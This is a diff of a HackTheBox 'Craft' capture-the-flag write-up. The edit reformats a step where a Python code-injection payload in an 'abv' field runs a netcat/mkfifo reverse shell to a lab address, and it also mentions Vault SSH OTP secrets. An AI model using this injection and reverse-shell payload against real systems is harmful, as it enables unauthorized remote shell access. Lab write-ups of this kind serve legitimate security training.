@@ -79,8 +79,10 @@ Payload (test.py):
  
 Test 4. Reverse shell (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
 Several failed till the netcat (without -e) option.
-	The payload becomes: 
-	brew_dict['abv'] = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4445 >/tmp/f")'
+
+The payload in __test.py__ becomes: 
+```brew_dict['abv'] = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4445 >/tmp/f")'```
+
 ![Test 4](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/test3.png)
 
 It's says root! Well that was easy! 
@@ -109,6 +111,7 @@ After obtaining user access on the machine more enumeration is required to disco
 ![vault_secrets](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/vault_secrets_list.png)
 
 Gilfoyle’s OTP setup:
+
 ![otp_setup](https://github.com/zomy22/zomy22.github.io/blob/master/hackthebox/craft_images/vault_write_ssh_otp.png)
 
 Reviewing the SSH Secrets Engine Documentation: https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html 
